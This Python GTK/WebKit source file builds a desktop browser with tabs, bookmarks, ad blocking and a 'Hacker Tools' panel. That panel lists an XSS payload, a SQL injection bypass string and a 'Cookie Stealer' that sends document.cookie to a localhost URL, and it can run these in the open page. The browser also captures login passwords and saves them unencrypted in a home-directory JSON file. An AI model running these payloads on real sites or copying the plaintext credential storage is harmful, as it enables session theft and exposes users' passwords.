import sys
import gi
import os
import json
import urllib.parse
from datetime import datetime
gi.require_version('Gtk', '3.0')
gi.require_version('WebKit2', '4.1')
from gi.repository import Gtk, Gdk, GLib, Pango
from gi.repository import WebKit2

START_PAGE_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Zero Browser Start</title><style>body { margin: 0; padding: 0; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; } .container { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 24px; padding: 40px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); animation: fadein 0.5s ease-out; } @keyframes fadein { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } } h1 { font-size: 48px; font-weight: 800; margin: 0 0 10px 0; background: linear-gradient(90deg, #4D90FE, #00C853); -webkit-background-clip: text; -webkit-text-fill-color: transparent; } p { color: #A0AAB5; font-size: 16px; margin-bottom: 30px; } .search-box { display: flex; align-items: center; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 10px 20px; margin-bottom: 30px; width: 400px; transition: all 0.3s ease; } .search-box:focus-within { border-color: #4D90FE; box-shadow: 0 0 15px rgba(77,144,254,0.2); } .search-box input { background: transparent; border: none; color: white; font-size: 16px; width: 100%; outline: none; } .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; } .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 20px 10px; text-decoration: none; color: white; font-size: 14px; font-weight: 500; transition: all 0.2s; } .card:hover { background: rgba(255,255,255,0.08); transform: translateY(-2px); border-color: rgba(255,255,255,0.2); }</style></head><body><div class="container"><h1 id="time">00:00</h1><p>Welcome to Zero Browser.</p><div class="search-box"><input type="text" id="q" placeholder="Search or enter URL..." autofocus></div><div class="grid"><a href="https://github.com" class="card">GitHub</a><a href="https://stackoverflow.com" class="card">StackOverflow</a><a href="https://youtube.com" class="card">YouTube</a><a href="zero://settings" class="card">Settings</a></div></div><script>function updateTime() { const now = new Date(); document.getElementById('time').innerText = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}); } setInterval(updateTime, 1000); updateTime(); document.getElementById('q').addEventListener('keypress', function(e) { if(e.key === 'Enter') { let val = this.value; if(val.includes('.') && !val.includes(' ')) { if(!val.startsWith('http')) val = 'https://' + val; window.location.href = val; } else { window.location.href = 'zero://search?q=' + encodeURIComponent(val); } } });</script></body></html>"""

SETTINGS_PAGE_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Zero Settings</title><style>body { margin: 0; padding: 40px; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; } h1 { font-size: 36px; font-weight: 800; margin-bottom: 30px; } .section { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 25px; margin-bottom: 20px; } h2 { font-size: 20px; margin-top: 0; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; margin-bottom: 20px; } .btn { background: #d32f2f; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; margin-right: 10px; transition: 0.2s; } .btn:hover { background: #b71c1c; } .info { color: #A0AAB5; margin-bottom: 20px; }</style></head><body><h1>Settings</h1><div class="section"><h2>Clear Browsing Data</h2><p class="info">This action is irreversible and will delete your data from the local machine.</p><button class="btn" onclick="window.webkit.messageHandlers.settings.postMessage('clear_history')">Clear History</button><button class="btn" onclick="window.webkit.messageHandlers.settings.postMessage('clear_bookmarks')">Clear Bookmarks</button><button class="btn" onclick="window.webkit.messageHandlers.settings.postMessage('clear_passwords')">Clear Passwords</button></div></body></html>"""

SCROLLBAR_CSS = "::-webkit-scrollbar { width: 8px; height: 8px; background: #12141a; } ::-webkit-scrollbar-thumb { background: #3a3f4b; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #4d90fe; } ::-webkit-scrollbar-corner { background: #12141a; }"
COSMETIC_ADBLOCK_CSS = ".adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, .text-ad, .textAd, .text_ad, .text_ads, .text-ads, .text-ad-links, div[id^='div-gpt-ad-'], div[id^='google_ads_iframe_'], iframe[id^='google_ads_iframe_'], div[class*='Sponsored'], div[class*='sponsored'], div[class*='Advert'], div[class*='advert'] { display: none !important; }"

PW_INJECT_JS = """
document.addEventListener('submit', function(e) {
    let form = e.target;
    let pwField = form.querySelector('input[type="password"]');
    if(pwField) {
        let userField = form.querySelector('input[type="text"], input[type="email"]');
        let user = userField ? userField.value : '';
        let pw = pwField.value;
        if(user && pw) {
            window.webkit.messageHandlers.passwords.postMessage(JSON.stringify({
                url: window.location.hostname,
                user: user,
                pass: pw
            }));
        }
    }
});
"""

SEARCH_ENGINES = {
    "google": "https://google.com/search?q=",
    "ddg": "https://duckduckgo.com/?q=",
    "bing": "https://www.bing.com/search?q="
}

class ZeroDevBrowser(Gtk.Window):
    def __init__(self):
        super().__init__(title="Zero Browser")
        self.set_default_size(1280, 800)
        
        settings = Gtk.Settings.get_default()
        settings.set_property("gtk-application-prefer-dark-theme", True)
        self.setup_css()
        
        self.tabs_map = {} 
        self.bm_path = os.path.join(os.path.expanduser("~"), ".zero_bookmarks.json")
        self.pw_path = os.path.join(os.path.expanduser("~"), ".zero_passwords.json")
        self.passwords = {}
        self.is_private = False
        self.current_workspace = "default"
        
        self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.add(self.main_vbox)
        self.connect("key-press-event", self.on_key_press)
        
        # ================= HEADER BAR =================
        self.header = Gtk.HeaderBar()
        self.header.set_show_close_button(True)
        self.header.set_title("Zero Browser")
        self.set_titlebar(self.header)

        self.btn_tabs = Gtk.ToggleButton()
        self.btn_tabs.set_active(True)
        self.btn_tabs.add(Gtk.Image.new_from_icon_name("format-justify-left-symbolic", Gtk.IconSize.MENU))
        self.btn_tabs.set_tooltip_text("Toggle Vertical Tabs")
        self.btn_tabs.connect("toggled", self.on_tabs_toggled)
        self.header.pack_start(self.btn_tabs)

        btn_back = Gtk.Button(); btn_back.add(Gtk.Image.new_from_icon_name("go-previous-symbolic", Gtk.IconSize.MENU))
        btn_forward = Gtk.Button(); btn_forward.add(Gtk.Image.new_from_icon_name("go-next-symbolic", Gtk.IconSize.MENU))
        btn_back.connect("clicked", lambda b: self.current_webview.go_back() if hasattr(self, 'current_webview') else None)
        btn_forward.connect("clicked", lambda b: self.current_webview.go_forward() if hasattr(self, 'current_webview') else None)
        for b in (btn_back, btn_forward): self.header.pack_start(b)
        
        self.btn_open_file = Gtk.Button()
        self.btn_open_file.add(Gtk.Image.new_from_icon_name("document-open-symbolic", Gtk.IconSize.MENU))
        self.btn_open_file.set_tooltip_text("Open Local File")
        self.btn_open_file.connect("clicked", self.on_open_file)
        self.header.pack_start(self.btn_open_file)

        # Center Search / URL Bar
        center_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=2)
        self.search_engine_combo = Gtk.ComboBoxText()
        self.search_engine_combo.append("google", "Google")
        self.search_engine_combo.append("ddg", "DuckDuckGo")
        self.search_engine_combo.append("bing", "Bing")
        self.search_engine_combo.set_active(0)
        center_box.pack_start(self.search_engine_combo, False, False, 0)
        
        self.url_bar = Gtk.Entry()
        self.url_bar.set_placeholder_text("Search or enter web address")
        self.url_bar.set_width_chars(50)
        self.url_bar.connect("activate", self.on_url_activate)
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.PRIMARY, "network-secure-symbolic")
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.SECONDARY, "view-refresh-symbolic")
        self.url_bar.connect("icon-press", lambda e, p, ev: self.current_webview.reload() if hasattr(self, 'current_webview') and p == Gtk.EntryIconPosition.SECONDARY else None)
        center_box.pack_start(self.url_bar, True, True, 0)
        
        self.lbl_zoom = Gtk.Label(label="")
        self.lbl_zoom.get_style_context().add_class("dim-label")
        center_box.pack_start(self.lbl_zoom, False, False, 5)
        
        self.header.set_custom_title(center_box)

        # POPOVERS
        self.build_downloads_popover()
        self.build_bookmarks_popover()
        self.build_history_popover()
        self.build_passwords_popover()
        
        self.load_bookmarks()
        self.load_passwords()

        self.btn_pip = Gtk.Button()
        self.btn_pip.add(Gtk.Image.new_from_icon_name("media-playback-start-symbolic", Gtk.IconSize.MENU))
        self.btn_pip.set_tooltip_text("Picture-in-Picture")
        self.btn_pip.connect("clicked", self.on_pip_toggled)
        self.header.pack_end(self.btn_pip)

        self.btn_screenshot = Gtk.Button()
        self.btn_screenshot.add(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU))
        self.btn_screenshot.set_tooltip_text("Screenshot")
        self.btn_screenshot.connect("clicked", self.on_take_screenshot)
        self.header.pack_end(self.btn_screenshot)
        
        self.btn_devtools = Gtk.ToggleButton()
        self.btn_devtools.add(Gtk.Image.new_from_icon_name("preferences-system-symbolic", Gtk.IconSize.MENU))
        self.btn_devtools.set_tooltip_text("Hacker Tools")
        self.btn_devtools.connect("toggled", self.on_devtools_toggled)
        self.header.pack_end(self.btn_devtools)

        self.btn_private = Gtk.ToggleButton()
        self.btn_private.add(Gtk.Image.new_from_icon_name("security-high-symbolic", Gtk.IconSize.MENU))
        self.btn_private.set_tooltip_text("Toggle Private Browsing Mode")
        self.btn_private.connect("toggled", self.on_private_toggled)
        self.header.pack_end(self.btn_private)

        self.btn_newtab = Gtk.Button()
        self.btn_newtab.add(Gtk.Image.new_from_icon_name("tab-new-symbolic", Gtk.IconSize.MENU))
        self.btn_newtab.set_tooltip_text("New Tab")
        self.btn_newtab.connect("clicked", lambda b: self.new_tab("zero://start"))
        self.header.pack_end(self.btn_newtab)

        # ================= LAYOUT =================
        self.hpaned_workspace = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
        self.main_vbox.pack_start(self.hpaned_workspace, True, True, 0)
        
        self.tabs_revealer = Gtk.Revealer(); self.tabs_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT); self.tabs_revealer.set_reveal_child(True)
        self.tabs_box = self.build_tabs_sidebar(); self.tabs_revealer.add(self.tabs_box)
        self.hpaned_workspace.pack1(self.tabs_revealer, False, False)
        
        self.vpaned = Gtk.Paned(orientation=Gtk.Orientation.VERTICAL)
        self.hpaned_workspace.pack2(self.vpaned, True, False)
        
        self.tab_stack = Gtk.Stack(); self.tab_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        self.vpaned.pack1(self.tab_stack, True, False)
        
        self.devtools_revealer = Gtk.Revealer(); self.devtools_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_UP); self.devtools_revealer.set_reveal_child(False)
        self.devtools_box = self.build_devtools(); self.devtools_revealer.add(self.devtools_box)
        self.vpaned.pack2(self.devtools_revealer, False, False)
        
        self.web_ctx = WebKit2.WebContext.new_ephemeral()
        self.web_ctx.connect("download-started", self.on_download_started)
        
        self.user_content = WebKit2.UserContentManager.new()
        self.user_content.register_script_message_handler("passwords")
        self.user_content.connect("script-message-received::passwords", self.on_password_intercepted)
        self.user_content.register_script_message_handler("settings")
        self.user_content.connect("script-message-received::settings", self.on_settings_message)
        
        for css in (SCROLLBAR_CSS, COSMETIC_ADBLOCK_CSS):
            sheet = WebKit2.UserStyleSheet(css, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None)
            self.user_content.add_style_sheet(sheet)
            
        pw_script = WebKit2.UserScript(PW_INJECT_JS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserScriptInjectionTime.END, None, None)
        self.user_content.add_script(pw_script)
        
        self.adblock_enabled = True
        self.new_tab("zero://start")

    def on_settings_message(self, manager, js_result):
        msg = js_result.get_js_value().to_string()
        if msg == "clear_history":
            for c in self.history_list.get_children(): self.history_list.remove(c)
            print("[*] History cleared.")
        elif msg == "clear_bookmarks":
            for c in self.bookmarks_list.get_children(): self.bookmarks_list.remove(c)
            if os.path.exists(self.bm_path): os.remove(self.bm_path)
            print("[*] Bookmarks cleared.")
        elif msg == "clear_passwords":
            for c in self.passwords_list.get_children(): self.passwords_list.remove(c)
            self.passwords.clear()
            if os.path.exists(self.pw_path): os.remove(self.pw_path)
            print("[*] Passwords cleared.")

    def on_private_toggled(self, btn):
        self.is_private = btn.get_active()
        ctx = self.header.get_style_context()
        if self.is_private:
            ctx.add_class("private-header")
            self.header.set_subtitle("Private Mode Active")
        else:
            ctx.remove_class("private-header")
            self.header.set_subtitle("")

    # ================= POPOVERS =================
    def build_downloads_popover(self):
        self.btn_downloads = Gtk.ToggleButton()
        self.btn_downloads.add(Gtk.Image.new_from_icon_name("folder-download-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_downloads)
        self.downloads_popover = Gtk.Popover(); self.downloads_popover.set_relative_to(self.btn_downloads)
        self.downloads_list = Gtk.ListBox(); self.downloads_list.set_selection_mode(Gtk.SelectionMode.NONE)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(350, 400); scroll.add(self.downloads_list); self.downloads_popover.add(scroll)
        self.btn_downloads.connect("toggled", lambda b: self.downloads_popover.popup() if b.get_active() else self.downloads_popover.popdown())
        self.downloads_popover.connect("closed", lambda p: self.btn_downloads.set_active(False))

    def build_history_popover(self):
        self.btn_history = Gtk.ToggleButton()
        self.btn_history.add(Gtk.Image.new_from_icon_name("document-open-recent-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_history)
        self.history_popover = Gtk.Popover(); self.history_popover.set_relative_to(self.btn_history)
        self.history_list = Gtk.ListBox(); self.history_list.connect("row-activated", self.on_popover_row_clicked)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.history_list); self.history_popover.add(scroll)
        self.btn_history.connect("toggled", lambda b: self.history_popover.popup() if b.get_active() else self.history_popover.popdown())
        self.history_popover.connect("closed", lambda p: self.btn_history.set_active(False))

    def build_bookmarks_popover(self):
        self.btn_bookmark = Gtk.ToggleButton()
        self.btn_bookmark.add(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_bookmark)
        self.bookmarks_popover = Gtk.Popover(); self.bookmarks_popover.set_relative_to(self.btn_bookmark)
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        
        btn_add = Gtk.Button(label="Bookmark Current Page")
        btn_add.connect("clicked", self.on_add_bookmark)
        box.pack_start(btn_add, False, False, 5)
        
        self.bookmarks_list = Gtk.ListBox(); self.bookmarks_list.connect("row-activated", self.on_popover_row_clicked)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.bookmarks_list); box.pack_start(scroll, True, True, 0)
        self.bookmarks_popover.add(box)
        self.btn_bookmark.connect("toggled", lambda b: self.bookmarks_popover.popup() if b.get_active() else self.bookmarks_popover.popdown())
        self.bookmarks_popover.connect("closed", lambda p: self.btn_bookmark.set_active(False))

    def build_passwords_popover(self):
        self.btn_passwords = Gtk.ToggleButton()
        self.btn_passwords.add(Gtk.Image.new_from_icon_name("dialog-password-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_passwords)
        self.passwords_popover = Gtk.Popover(); self.passwords_popover.set_relative_to(self.btn_passwords)
        self.passwords_list = Gtk.ListBox(); self.passwords_list.set_selection_mode(Gtk.SelectionMode.NONE)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.passwords_list); self.passwords_popover.add(scroll)
        self.btn_passwords.connect("toggled", lambda b: self.passwords_popover.popup() if b.get_active() else self.passwords_popover.popdown())
        self.passwords_popover.connect("closed", lambda p: self.btn_passwords.set_active(False))

    def add_to_popover(self, listbox, main_text, sub_text, icon_name):
        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10); hbox.set_margin_top(5); hbox.set_margin_bottom(5); hbox.set_margin_start(10)
        icon = Gtk.Image.new_from_icon_name(icon_name, Gtk.IconSize.MENU)
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        l1 = Gtk.Label(label=main_text); l1.set_halign(Gtk.Align.START); l1.set_ellipsize(Pango.EllipsizeMode.END); l1.set_max_width_chars(30)
        l2 = Gtk.Label(label=sub_text); l2.set_halign(Gtk.Align.START); l2.set_ellipsize(Pango.EllipsizeMode.END); l2.set_max_width_chars(30); l2.get_style_context().add_class("dim-label")
        vbox.pack_start(l1, False, False, 0); vbox.pack_start(l2, False, False, 0)
        hbox.pack_start(icon, False, False, 0); hbox.pack_start(vbox, True, True, 0)
        row.add(hbox); row.show_all()
        row.url_data = sub_text
        listbox.insert(row, 0)

    def on_popover_row_clicked(self, listbox, row):
        if hasattr(row, 'url_data'):
            self.url_bar.set_text(row.url_data)
            self.on_url_activate(self.url_bar)
            if listbox == self.history_list: self.btn_history.set_active(False)
            if listbox == self.bookmarks_list: self.btn_bookmark.set_active(False)

    def on_open_file(self, btn):
        dialog = Gtk.FileChooserNative.new("Open File", self, Gtk.FileChooserAction.OPEN, "_Open", "_Cancel")
        if dialog.run() == Gtk.ResponseType.ACCEPT:
            uri = dialog.get_uri()
            if hasattr(self, 'current_webview'): self.current_webview.load_uri(uri)
        dialog.destroy()

    def on_password_intercepted(self, manager, js_result):
        if self.is_private: return
        try:
            data = json.loads(js_result.get_js_value().to_string())
            domain = data.get("url")
            user = data.get("user")
            pw = data.get("pass")
            if domain and pw:
                self.passwords[domain] = {"user": user, "pass": pw}
                self.save_passwords()
                print(f"[*] Intercepted and saved credentials for {domain}")
        except Exception as e:
            print("Error parsing password interception:", e)

    def load_passwords(self):
        if os.path.exists(self.pw_path):
            try:
                with open(self.pw_path, 'r') as f:
                    self.passwords = json.load(f)
                    for domain, cred in self.passwords.items():
                        self.add_to_popover(self.passwords_list, domain, f"{cred['user']} / ***", "dialog-password-symbolic")
            except: pass

    def save_passwords(self):
        with open(self.pw_path, 'w') as f: json.dump(self.passwords, f)
        for c in self.passwords_list.get_children(): self.passwords_list.remove(c)
        for domain, cred in self.passwords.items(): self.add_to_popover(self.passwords_list, domain, f"{cred['user']} / ***", "dialog-password-symbolic")

    def load_bookmarks(self):
        if os.path.exists(self.bm_path):
            try:
                with open(self.bm_path, 'r') as f:
                    for title, url in json.load(f): self.add_to_popover(self.bookmarks_list, title, url, "bookmark-new-symbolic")
            except: pass

    def save_bookmarks(self):
        bookmarks = []
        for row in self.bookmarks_list.get_children():
            vbox = row.get_child().get_children()[1]
            title = vbox.get_children()[0].get_text()
            url = row.url_data
            bookmarks.append([title, url])
        with open(self.bm_path, 'w') as f: json.dump(bookmarks, f)

    def on_add_bookmark(self, btn):
        if hasattr(self, 'current_webview'):
            uri = self.current_webview.get_uri()
            if uri and not uri.startswith("zero://"):
                title = self.current_webview.get_title() or "Untitled"
                self.add_to_popover(self.bookmarks_list, title, uri, "bookmark-new-symbolic")
                self.save_bookmarks()
                self.btn_bookmark.set_active(False)

    def update_zoom_label(self):
        if hasattr(self, 'current_webview'):
            lvl = self.current_webview.get_zoom_level()
            if abs(lvl - 1.0) < 0.05:
                self.lbl_zoom.set_text("")
            else:
                self.lbl_zoom.set_text(f"{int(lvl * 100)}%")

    def on_key_press(self, widget, event):
        if event.state & Gdk.ModifierType.CONTROL_MASK:
            if event.keyval == Gdk.KEY_t:
                self.new_tab("zero://start")
                return True
            elif event.keyval == Gdk.KEY_w:
                if hasattr(self, 'current_webview'):
                    for wid, data in self.tabs_map.items():
                        if data[0] == self.current_webview:
                            self.close_tab(wid)
                            break
                return True
            elif event.keyval == Gdk.KEY_l:
                self.url_bar.grab_focus()
                return True
            elif event.keyval in (Gdk.KEY_plus, Gdk.KEY_equal):
                if hasattr(self, 'current_webview'):
                    self.current_webview.set_zoom_level(self.current_webview.get_zoom_level() + 0.1)
                    self.update_zoom_label()
                return True
            elif event.keyval == Gdk.KEY_minus:
                if hasattr(self, 'current_webview'):
                    self.current_webview.set_zoom_level(max(0.3, self.current_webview.get_zoom_level() - 0.1))
                    self.update_zoom_label()
                return True
            elif event.keyval == Gdk.KEY_0:
                if hasattr(self, 'current_webview'):
                    self.current_webview.set_zoom_level(1.0)
                    self.update_zoom_label()
                return True
        return False

    def on_pip_toggled(self, btn):
        if not hasattr(self, 'current_webview'): return
        js = "if(document.pictureInPictureElement){document.exitPictureInPicture();}else{const v=document.querySelector('video');if(v){v.requestPictureInPicture();}}"
        self.current_webview.run_javascript(js, None, None, None)

    def on_take_screenshot(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_snapshot_ready(webview, result):
            try:
                surface = webview.get_snapshot_finish(result)
                if surface:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filepath = os.path.join(os.path.expanduser("~"), "Downloads", f"zero_screenshot_{ts}.png")
                    surface.write_to_png(filepath)
                    btn.set_image(Gtk.Image.new_from_icon_name("emblem-ok-symbolic", Gtk.IconSize.MENU))
                    GLib.timeout_add(1500, lambda: btn.set_image(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU)) and False)
            except: pass
        self.current_webview.get_snapshot(WebKit2.SnapshotRegion.FULL_DOCUMENT, WebKit2.SnapshotOptions.NONE, None, on_snapshot_ready)

    def build_tabs_sidebar(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(200, -1); box.get_style_context().add_class("vertical-tabs-box")
        
        # Workspace Dropdown
        self.workspace_combo = Gtk.ComboBoxText()
        self.workspace_combo.append("default", "Default Workspace")
        self.workspace_combo.append("work", "Work")
        self.workspace_combo.append("social", "Social")
        self.workspace_combo.append("research", "Research")
        self.workspace_combo.set_active(0)
        self.workspace_combo.connect("changed", self.on_workspace_changed)
        self.workspace_combo.set_margin_top(10); self.workspace_combo.set_margin_bottom(10); self.workspace_combo.set_margin_start(10); self.workspace_combo.set_margin_end(10)
        box.pack_start(self.workspace_combo, False, False, 0)
        
        self.tab_listbox = Gtk.ListBox(); self.tab_listbox.get_style_context().add_class("vertical-tabs-list"); self.tab_listbox.connect("row-activated", self.on_tab_clicked)
        scroll = Gtk.ScrolledWindow(); scroll.add(self.tab_listbox); box.pack_start(scroll, True, True, 0)
        return box
        
    def on_workspace_changed(self, combo):
        self.current_workspace = combo.get_active_id()
        visible_count = 0
        first_visible = None
        for wid, data in self.tabs_map.items():
            wv, row, ws = data
            if ws == self.current_workspace:
                row.show()
                visible_count += 1
                if not first_visible: first_visible = row
            else:
                row.hide()
        
        if visible_count == 0:
            self.new_tab("zero://start")
        elif first_visible:
            self.tab_listbox.select_row(first_visible)
            self.on_tab_clicked(self.tab_listbox, first_visible)

    def on_tabs_toggled(self, btn): self.tabs_revealer.set_reveal_child(btn.get_active())

    def on_tab_clicked(self, listbox, row):
        wid = row.get_name(); self.tab_stack.set_visible_child_name(wid); wv = self.tabs_map[wid][0]; self.current_webview = wv
        self.url_bar.set_text(wv.get_uri() or ""); self.header.set_title(wv.get_title() or "Zero Browser")
        self.update_zoom_label()

    def toggle_mute(self, wid, btn):
        if wid in self.tabs_map:
            wv = self.tabs_map[wid][0]
            is_muted = btn.get_active()
            wv.set_is_muted(is_muted)
            btn.set_image(Gtk.Image.new_from_icon_name("audio-volume-muted-symbolic" if is_muted else "audio-volume-high-symbolic", Gtk.IconSize.MENU))

    def close_tab(self, wid, btn=None):
        if wid in self.tabs_map:
            wv, row, ws = self.tabs_map[wid]
            self.tab_listbox.remove(row); self.tab_stack.remove(self.tab_stack.get_child_by_name(wid)); wv.destroy(); del self.tabs_map[wid]
            
            # Find next visible tab in current workspace
            next_visible = None
            for c in self.tab_listbox.get_children():
                if c.is_visible():
                    next_visible = c
                    break
            
            if next_visible:
                self.tab_listbox.select_row(next_visible); self.on_tab_clicked(self.tab_listbox, next_visible)
            else: self.new_tab("zero://start")

    def on_devtools_toggled(self, btn): self.devtools_revealer.set_reveal_child(btn.get_active())

    def build_devtools(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(-1, 280)
        toolbar = Gtk.Toolbar(); toolbar.get_style_context().add_class("primary-toolbar")
        self.dev_stack = Gtk.Stack(); self.dev_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        switcher = Gtk.StackSwitcher(); switcher.set_stack(self.dev_stack)
        toolbar_item = Gtk.ToolItem(); toolbar_item.add(switcher); toolbar.insert(toolbar_item, 0)
        
        sec_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        self.btn_adblock = Gtk.ToggleButton(label="Adblock ON"); self.btn_adblock.set_active(True); self.btn_adblock.connect("toggled", self.on_adblock_toggled); sec_box.pack_start(self.btn_adblock, False, False, 0)
        self.ua_combo = Gtk.ComboBoxText(); self.ua_combo.append("default", "Standard UA"); self.ua_combo.append("mobile", "Mobile (iPhone)"); self.ua_combo.append("bot", "Googlebot"); self.ua_combo.set_active(0); self.ua_combo.connect("changed", self.on_ua_changed); sec_box.pack_end(self.ua_combo, False, False, 0)
        
        ti_sec = Gtk.ToolItem(); ti_sec.set_expand(True); ti_sec.add(sec_box); toolbar.insert(ti_sec, 1)
        box.pack_start(toolbar, False, False, 0); box.pack_start(self.dev_stack, True, True, 0)
        
        self.dev_stack.add_titled(self.build_js_console(), "js", "JS Console"); self.dev_stack.add_titled(self.build_network_panel(), "network", "Network"); self.dev_stack.add_titled(self.build_cookie_explorer(), "cookies", "Cookies"); self.dev_stack.add_titled(self.build_storage_explorer(), "storage", "Storage"); self.dev_stack.add_titled(self.build_source_viewer(), "source", "DOM Source"); self.dev_stack.add_titled(self.build_css_panel(), "css", "CSS Inject"); self.dev_stack.add_titled(self.build_terminal_emulator(), "term", "Python Term")
        self.dev_stack.connect("notify::visible-child", self.on_dev_stack_changed)
        
        plist = Gtk.ListBox()
        for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
            row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
        plist.connect("row-activated", lambda lb, r: self.current_webview.run_javascript(r.get_child().get_children()[1].get_text()[11:], None, None, None) if hasattr(self, 'current_webview') and r.get_child().get_children()[1].get_text().startswith("javascript:") else None)
        scroll = Gtk.ScrolledWindow(); scroll.add(plist)
        self.dev_stack.add_titled(scroll, "payloads", "Payloads")
        
        return box

    def on_adblock_toggled(self, btn):
        self.adblock_enabled = btn.get_active(); btn.set_label("Adblock ON" if self.adblock_enabled else "Adblock OFF")
        self.user_content.remove_all_style_sheets()
        self.user_content.add_style_sheet(WebKit2.UserStyleSheet(SCROLLBAR_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
        if self.adblock_enabled: self.user_content.add_style_sheet(WebKit2.UserStyleSheet(COSMETIC_ADBLOCK_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
        if hasattr(self, 'current_webview'): self.current_webview.reload()

    def on_ua_changed(self, combo):
        val = combo.get_active_id(); ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" if val == "mobile" else "Googlebot/2.1 (+http://www.google.com/bot.html)" if val == "bot" else None
        if hasattr(self, 'current_webview'):
            settings = self.current_webview.get_settings(); settings.set_user_agent(ua) if ua else settings.set_user_agent(None); self.current_webview.set_settings(settings); self.current_webview.reload()

    def on_dev_stack_changed(self, stack, param):
        name = stack.get_visible_child_name()
        if name == "cookies": self.refresh_cookies()
        elif name == "storage": self.refresh_storage()
        elif name == "source": self.on_fetch_source(None)

    def on_download_started(self, context, download):
        filename = download.get_request().get_uri().split("/")[-1] or "downloaded_file"
        dest = os.path.join(os.path.expanduser("~"), "Downloads", filename)
        download.set_destination("file://" + dest)
        
        row = Gtk.ListBoxRow()
        row.set_margin_top(5); row.set_margin_bottom(5); row.set_margin_start(10); row.set_margin_end(10)
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
        
        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        lbl_name = Gtk.Label(label=filename)
        lbl_name.set_halign(Gtk.Align.START); lbl_name.set_ellipsize(Pango.EllipsizeMode.END)
        lbl_status = Gtk.Label(label="Downloading...")
        lbl_status.set_halign(Gtk.Align.END); lbl_status.get_style_context().add_class("bold-label")
        hbox.pack_start(lbl_name, True, True, 0); hbox.pack_end(lbl_status, False, False, 0)
        
        pbar = Gtk.ProgressBar()
        pbar.set_fraction(0.0)
        
        btn_cancel = Gtk.Button(label="Cancel")
        btn_cancel.connect("clicked", lambda b: download.cancel())
        
        vbox.pack_start(hbox, False, False, 0)
        vbox.pack_start(pbar, False, False, 0)
        vbox.pack_start(btn_cancel, False, False, 0)
        row.add(vbox); row.show_all()
        
        self.downloads_list.insert(row, 0)
